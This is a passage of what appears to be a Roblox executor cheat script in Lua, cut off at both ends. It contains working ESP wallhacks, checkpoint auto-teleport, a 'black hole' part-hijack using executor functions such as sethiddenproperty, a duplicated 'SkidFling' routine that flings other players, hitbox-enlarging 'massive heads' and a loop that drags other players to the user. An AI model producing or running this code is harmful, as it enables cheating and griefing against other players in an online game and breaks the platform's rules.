    -- Create TextLabel
    local textLabel = Instance.new("TextLabel", billboardGui)
    textLabel.Text = player.Name
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = player.Team == game.Players.LocalPlayer.Team and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)  -- Green for teammates, red for non-teammates

    -- Store ESP object
    espObjects[player] = {
        billboardGui = billboardGui,
        textLabel = textLabel
    }

    -- Parent BillboardGui to player's head
    billboardGui.Parent = player.Character.Head
end

-- Function to remove ESP from a player
local function removeEsp(player)
    if espObjects[player] then
        espObjects[player].billboardGui:Destroy()
        espObjects[player] = nil
    end
end

-- Function to update ESP size based on distance
local function updateEspSize()
    for player, esp in pairs(espObjects) do
        if player.Character and player.Character:FindFirstChild("Head") then
            local distance = (game.Players.LocalPlayer.Character.Head.Position - player.Character.Head.Position).magnitude
            esp.billboardGui.Size = UDim2.new(distance / 50, 0, distance / 50, 0)  -- Adjust size based on distance
        end
    end
end

-- Function to handle player respawn
local function onCharacterAdded(player)
    -- Wait for the head to be created
    player.Character:WaitForChild("Head")
    createEsp(player)
end

-- Function to enable ESP
function EspOn()
    -- Create ESP for all players
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            createEsp(player)
            -- Connect CharacterAdded event to handle respawns
            espConnections[player] = player.CharacterAdded:Connect(function()
                onCharacterAdded(player)
            end)
        end
    end

    -- Connect PlayerAdded event to handle rejoins
    game.Players.PlayerAdded:Connect(function(player)
        if player ~= game.Players.LocalPlayer then
            createEsp(player)
            -- Connect CharacterAdded event to handle respawns
            espConnections[player] = player.CharacterAdded:Connect(function()
                onCharacterAdded(player)
            end)
        end
    end)

    -- Connect PlayerRemoving event
    game.Players.PlayerRemoving:Connect(function(player)
        removeEsp(player)
        -- Disconnect the CharacterAdded event
        if espConnections[player] then
            espConnections[player]:Disconnect()
            espConnections[player] = nil
        end
    end)

    -- Connect RenderStepped event to update ESP size
    game:GetService("RunService").RenderStepped:Connect(updateEspSize)
end

-- Function to disable ESP
function EspOff()
    -- Remove ESP from all players
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            removeEsp(player)
            -- Disconnect the CharacterAdded event
            if espConnections[player] then
                espConnections[player]:Disconnect()
                espConnections[player] = nil
            end
        end
    end

    -- Disconnect all RenderStepped events (optional, but recommended for cleanup)
    for _, connection in ipairs(game:GetService("RunService").RenderStepped:GetConnections()) do
        connection:Disconnect()
    end
end

-- WinObby
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Settings
local TELEPORT_HEIGHT = 3
local TELEPORT_DELAY = 0.1
local RETRY_DELAY = 0.10
local MAX_ATTEMPTS = 100

-- Find all potential checkpoint containers
local potentialContainers = {
    "Checkpoints", "checkpoints", "Checkpoint", "checkpoint",
    "CP", "cp", "Flags", "flags", "Flag", "flag",
    "Markers", "markers", "Waypoints", "waypoints"
}

-- Function to find the first valid container
local function findCheckpointContainer()
    for _, name in ipairs(potentialContainers) do
        local container = game.Workspace:FindFirstChild(name)
        if container then
            print("Found checkpoint container:", container.Name)
            return container
        end
    end
    return nil
end

local checkpointContainer = findCheckpointContainer()

if not checkpointContainer then
    warn("No checkpoint container found! Searching entire Workspace...")
    checkpointContainer = game.Workspace
end

-- Collect all potential checkpoints
local checkpoints = {}
for _, child in ipairs(checkpointContainer:GetDescendants()) do
    if child:IsA("BasePart") then
        -- Check for common checkpoint name patterns (case-insensitive)
        local lowerName = child.Name:lower()
        if lowerName:find("checkpoint") or 
           lowerName:find("cp") or 
           lowerName:find("flag") or 
           lowerName:find("marker") or 
           lowerName:find("waypoint") or
           #checkpointContainer:GetChildren() < 10 then -- If container has few children, assume all are checkpoints
            table.insert(checkpoints, child)
            print("Found potential checkpoint:", child:GetFullName())
        end
    end
end

if #checkpoints == 0 then
    -- Last resort: collect all parts in container
    warn("No specifically named checkpoints found. Collecting all parts in container...")
    for _, child in ipairs(checkpointContainer:GetChildren()) do
        if child:IsA("BasePart") then
            table.insert(checkpoints, child)
            print("Including part as checkpoint:", child:GetFullName())
        end
    end
end

if #checkpoints == 0 then
    error("No valid checkpoints found anywhere in workspace!")
    return
end

-- Smart sorting function
local function getSortValue(name)
    -- First try to extract number
    local num = tonumber(name:match("%d+"))
    if num then return num end
    
    -- Then try letter value (A=1, B=2, etc) 
    local letter = name:upper():match("^[A-Z]")
    if letter then return string.byte(letter) - 64 end
    
    -- Default for unnamed parts
    return 0
end

table.sort(checkpoints, function(a, b)
    local aVal = getSortValue(a.Name)
    local bVal = getSortValue(b.Name)
    
    if aVal == bVal then
        return a.Name:lower() < b.Name:lower()
    else
        return aVal < bVal
    end
end)

print("Sorted checkpoints order:")
for i, checkpoint in ipairs(checkpoints) do
    print(i, checkpoint:GetFullName())
end

-- Enhanced teleport function
local function teleportToCheckpoint(checkpoint)
    if not (character and character.Parent) then
        character = player.Character or player.CharacterAdded:Wait()
        humanoid = character:WaitForChild("Humanoid")
        rootPart = character:WaitForChild("HumanoidRootPart")
    end
    
    local success = pcall(function()
        rootPart.CFrame = checkpoint.CFrame + Vector3.new(0, TELEPORT_HEIGHT, 0)
    end)
    
    if not success then
        -- Try alternative teleport method
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = checkpoint.CFrame + Vector3.new(0, TELEPORT_HEIGHT, 0)
            return true
        end
        return false
    end
    return true
end

function TPCheckpoints()
    print("Starting teleportation sequence to", #checkpoints, "checkpoints...")
    
    for i, checkpoint in ipairs(checkpoints) do
        local attempts = 0
        local teleported = false
        
        while attempts < MAX_ATTEMPTS and not teleported do
            attempts += 1
            teleported = teleportToCheckpoint(checkpoint)
            
            if not teleported then
                warn("Attempt", attempts, "failed for", checkpoint:GetFullName())
                task.wait(RETRY_DELAY)
            end
        end
        
        if teleported then
            print("Successfully teleported to", checkpoint:GetFullName())
            if i < #checkpoints then
                task.wait(TELEPORT_DELAY)
            end
        else
            warn("Failed to teleport to", checkpoint:GetFullName(), "after", MAX_ATTEMPTS, "attempts")
        end
    end
    
    print("Teleportation sequence complete!")
end

-- VoidProtection
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local VOID_HEIGHT = -100 -- Adjust this value based on your game's void height
local TELEPORT_OFFSET = 5 -- Offset above the platform to teleport the player

local enabled = false

local function findNearbyPlatform(position)
    -- Raycast downward to find a platform
    local rayOrigin = Vector3.new(position.X, position.Y, position.Z)
    local rayDirection = Vector3.new(0, -1000, 0) -- Raycast downward
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = {Players.LocalPlayer.Character} -- Ignore the player's character

    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    
    if raycastResult and raycastResult.Instance then
        -- Found a platform, return its position
        return raycastResult.Position + Vector3.new(0, TELEPORT_OFFSET, 0)
    end
    
    return nil -- No platform found
end

local function checkVoid()
    while enabled do
        for _, player in ipairs(Players:GetPlayers()) do
            local character = player.Character
            if character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    local position = humanoidRootPart.Position
                    if position.Y < VOID_HEIGHT then
                        -- Try to find a nearby platform
                        local teleportPosition = findNearbyPlatform(position)
                        if teleportPosition then
                            character:SetPrimaryPartCFrame(CFrame.new(teleportPosition))
                        else
                            -- If no platform is found, teleport to a default position
                            character:SetPrimaryPartCFrame(CFrame.new(0, TELEPORT_OFFSET, 0))
                        end
                    end
                end
            end
        end
        RunService.Stepped:wait()
    end
end

local function TpVoidOn()
    enabled = true
    checkVoid()
end

local function TpVoidOff()
    enabled = false
end

-- Black Hole Script Function
local function blackHoleScript()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local Workspace = game:GetService("Workspace")

    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    if not Network then
        Network = {
            BaseParts = {},
            Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
        }

        Network.RetainPart = function(Part)
            if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
                table.insert(Network.BaseParts, Part)
                Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
                Part.CanCollide = false
            end
        end

        local function EnablePartControl()
            LocalPlayer.ReplicationFocus = Workspace
            RunService.Heartbeat:Connect(function()
                sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
                for _, Part in pairs(Network.BaseParts) do
                    if Part:IsDescendantOf(Workspace) then
                        Part.Velocity = Network.Velocity
                    end
                end
            end)
        end

        EnablePartControl()
    end

    local function ForcePart(v)
        if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
            for _, x in next, v:GetChildren() do
                if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                    x:Destroy()
                end
            end
            if v:FindFirstChild("Attachment") then
                v:FindFirstChild("Attachment"):Destroy()
            end
            if v:FindFirstChild("AlignPosition") then
                v:FindFirstChild("AlignPosition"):Destroy()
            end
            if v:FindFirstChild("Torque") then
                v:FindFirstChild("Torque"):Destroy()
            end
            v.CanCollide = false
            local Torque = Instance.new("Torque", v)
            Torque.Torque = Vector3.new(100000, 100000, 100000)
            local AlignPosition = Instance.new("AlignPosition", v)
            local Attachment2 = Instance.new("Attachment", v)
            Torque.Attachment0 = Attachment2
            AlignPosition.MaxForce = 9999999999999999
            AlignPosition.MaxVelocity = math.huge
            AlignPosition.Responsiveness = 200
            AlignPosition.Attachment0 = Attachment2
            AlignPosition.Attachment1 = Attachment1
        end
    end

    blackHoleActive = true

    for _, v in next, Workspace:GetDescendants() do
        ForcePart(v)
    end

    Workspace.DescendantAdded:Connect(function(v)
        if blackHoleActive then
            ForcePart(v)
        end
    end)

    spawn(function()
        while blackHoleActive and RunService.RenderStepped:Wait() do
            Attachment1.WorldCFrame = humanoidRootPart.CFrame
        end
    end)
end

-- Function to disable black hole
local function disableBlackHole()
    blackHoleActive = false
    if Folder then
        Folder:Destroy()
        Folder = nil
    end
    if Network then
        Network.BaseParts = {}
    end
end

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local AllBool = false

local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end

local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessory and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    end
end

local StartFlingAll = function(Targets)
    if Targets[1] then 
        for _,x in next, Targets do 
            GetPlayer(x) 
        end 
    else 
        return 
    end

    if AllBool then
        for _,x in next, Players:GetPlayers() do
            SkidFling(x)
        end
    end

    for _,x in next, Targets do
        if GetPlayer(x) and GetPlayer(x) ~= Player then
            if GetPlayer(x).UserId ~= 1414978355 then
                local TPlayer = GetPlayer(x)
                if TPlayer then
                    SkidFling(TPlayer)
                end
            end
        end
    end
end

-- Fling Functionality without UI

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local function GetPlayer(Name)
    Name = Name:lower()
    for _, x in next, Players:GetPlayers() do
        if x ~= Player then
            if x.Name:lower():match("^" .. Name) or x.DisplayName:lower():match("^" .. Name) then
                return x
            end
        end
    end
    return nil
end

local function Message(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end

local function SkidFling(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
    local TRootPart = THumanoid and THumanoid.RootPart
    local THead = TCharacter and TCharacter:FindFirstChild("Head")
    local Accessory = TCharacter and TCharacter:FindFirstChildOfClass("Accessory")
    local Handle = Accessory and Accessory:FindFirstChild("Handle")

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit then
            return Message("Error Occurred", "Target is sitting", 5)
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        else
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local function FPos(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local function SFBasePart(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Occurred", "Random error", 5)
    end
end


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local math = math

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:WaitForChild("HumanoidRootPart") -- R15 part

local particleEmitter = Instance.new("ParticleEmitter")
particleEmitter.Texture = "rbxassetid://<your_cube_texture_id>"
particleEmitter.Color = ColorSequence.new(Color3.fromRGB(255, 255, 0))
particleEmitter.Size = NumberSequence.new(0.3)
particleEmitter.Lifetime = NumberRange.new(1)
particleEmitter.Rate = 10
particleEmitter.Parent = torso

local function spawnCube()
    local cube = Instance.new("Part")
    cube.Shape = Enum.PartType.Block
    cube.Size = Vector3.new(0.3, 0.3, 0.3)
    cube.Color = Color3.fromRGB(255, 255, 0)
    cube.Anchored = true
    cube.CanCollide = false
    cube.Material = Enum.Material.Neon -- Neon material for glowing effect

    local light = Instance.new("PointLight")
    light.Color = Color3.fromRGB(255, 255, 0)
    light.Brightness = 0.5
    light.Range = 3
    light.Parent = cube

    cube.Parent = workspace

    -- Generate spinning oval coordinates
    local radiusX = 2.5 -- Horizontal radius
    local radiusY = 1.5 -- Vertical radius
    local theta = math.random() * 2 * math.pi -- Random angle
    local x = radiusX * math.cos(theta)
    local y = radiusY * math.sin(theta)
    local z = math.random(-1, 1) -- Random depth

    -- Apply rotation to create spinning effect
    local rotationAngle = tick() * 5 -- Adjust speed here (higher = faster)
    local rotatedX = x * math.cos(rotationAngle) - z * math.sin(rotationAngle)
    local rotatedZ = x * math.sin(rotationAngle) + z * math.cos(rotationAngle)

    cube.Position = torso.Position + Vector3.new(rotatedX, y, rotatedZ)

    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
    local tweenGoal = {Transparency = 1}
    local tween = TweenService:Create(cube, tweenInfo, tweenGoal)
    tween:Play()
    tween.Completed:Connect(function()
        cube:Destroy()
    end)
end

local emitterEnabled = false
local cubeSpawnConnection

function EmitterOn()
    if not emitterEnabled then
        emitterEnabled = true
        particleEmitter.Enabled = true
        cubeSpawnConnection = RunService.RenderStepped:Connect(function()
            spawnCube()
        end)
    end
end

function EmitterOff()
    if emitterEnabled then
        emitterEnabled = false
        particleEmitter.Enabled = false
        if cubeSpawnConnection then
            cubeSpawnConnection:Disconnect()
            cubeSpawnConnection = nil
        end
    end
end

EmitterOn()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function MassiveHeadsOn()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local character = player.Character
            if character then
                local head = character:FindFirstChild("Head")
                if head then
                    head.Size = Vector3.new(10, 10, 10)
                    head.Transparency = 0.5
                    head.CanCollide = false
                end
            end
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            local head = character:WaitForChild("Head")
            head.Size = Vector3.new(10, 10, 10)
            head.Transparency = 0.5
            head.CanCollide = false
        end)
    end)
end

function MassiveHeadsOff()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local character = player.Character
            if character then
                local head = character:FindFirstChild("Head")
                if head then
                    head.Size = Vector3.new(2, 1, 1)
                    head.Transparency = 0
                    head.CanCollide = true
                end
            end
        end
    end
end

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local localroot = character:WaitForChild("HumanoidRootPart")

local function UpdateChar()
    character = player.Character or player.CharacterAdded:Wait()
    localroot = character:WaitForChild("HumanoidRootPart")
end

game.Players.LocalPlayer.CharacterAdded:Connect(UpdateChar)

local TogglePlayerOnly = false
local originalPositions = {}
local originalParent = {}

local function bringPlayerOnly()
    if TogglePlayerOnly then
        spawn(function()
            while TogglePlayerOnly do
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= player and v.Character then
                        local targetRoot = v.Character:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
                            -- Store original position and parent
                            if not originalPositions[v.UserId] then
                                originalPositions[v.UserId] = targetRoot.CFrame
                                originalParent[v.UserId] = targetRoot.Parent
                            end

                            -- Disable collisions and hide character
                            targetRoot.CanCollide = false
                            v.Character.Parent = game.Workspace -- Move to workspace to hide from other players

                            -- Teleport to local player position
                            local offset = CFrame.new(1, 4, -2)
                            targetRoot.CFrame = localroot.CFrame * offset
                        end
                    end
                end
                game:GetService("RunService").Heartbeat:Wait()

                -- Check if local player has died
                if not localroot or not localroot.Parent then
                    TogglePlayerOnly = false
                end
            end

            -- Restore positions and visibility
            for _, v in pairs(game.Players:GetPlayers()) do
                if v ~= player and v.Character then
                    local targetRoot = v.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot and originalPositions[v.UserId] then
                        targetRoot.CFrame = originalPositions[v.UserId]
                        targetRoot.Parent = originalParent[v.UserId]
                        targetRoot.CanCollide = true
                    end
                end
            end

            originalPositions = {}
            originalParent = {}
        end)
    end
end

-- Turn on bringing players close
function ItemTpOn()
    TogglePlayerOnly = true
    bringPlayerOnly()
end

-- Turn off bringing players close
function ItemTpOff()
    TogglePlayerOnly = false
end

-- Monitor local player's character death
player.CharacterAdded:Connect(function()
    if TogglePlayerOnly then
        TogglePlayerOnly = false
    end
    UpdateChar()
end)

    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local localroot = character:WaitForChild("HumanoidRootPart")

local function UpdateChar()
    character = player.Character or player.CharacterAdded:Wait()
    localroot = character:WaitForChild("HumanoidRootPart")
end

game.Players.LocalPlayer.CharacterAdded:Connect(UpdateChar)

local TogglePlayerOnly = false

-- Function to bring players close to the local player
local function bringPlayerOnly()
    if TogglePlayerOnly then
        spawn(function()
            while TogglePlayerOnly do
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= player and v.Character then
                        local targetRoot = v.Character:FindFirstChild("HumanoidRootPart")
                        if targetRoot then
